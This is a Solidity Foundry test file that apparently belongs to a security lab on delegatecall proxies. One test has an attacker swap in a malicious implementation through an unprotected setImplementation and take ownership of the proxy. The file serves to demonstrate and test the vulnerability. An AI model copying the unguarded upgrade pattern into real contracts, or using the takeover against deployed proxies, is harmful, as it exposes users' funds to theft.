// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {DelegateLib} from "../src/DelegateLib.sol";
import {DelegatecallProxyVulnerable} from "../src/DelegatecallProxyVulnerable.sol";
import {MaliciousDelegate} from "../src/MaliciousDelegate.sol";

contract DelegatecallTest is Test {
    address internal deployer = makeAddr("deployer");
    address internal attacker = makeAddr("attacker");

    function test_DelegatecallTakeover_ChangesOwner() public {
        vm.startPrank(deployer);
        DelegateLib legit = new DelegateLib();
        DelegatecallProxyVulnerable proxy = new DelegatecallProxyVulnerable(address(legit));
        vm.stopPrank();

        assertEq(proxy.owner(), deployer, "initial owner should be deployer");

        vm.startPrank(attacker);
        MaliciousDelegate evil = new MaliciousDelegate();

        // Step 1: attacker points proxy to malicious implementation
        proxy.setImplementation(address(evil));
        // Step 2: trigger delegatecall into malicious code
        proxy.executeSetValue(123);
        vm.stopPrank();

        assertEq(proxy.owner(), attacker, "attacker should become owner");
    }

    function test_NormalFlow_WithLegitImplementation_UpdatesValue() public {
        DelegateLib legit = new DelegateLib();
        DelegatecallProxyVulnerable proxy = new DelegatecallProxyVulnerable(address(legit));

        proxy.executeSetValue(777);

        assertEq(proxy.value(), 777, "value should update via legit delegatecall");
    }
}
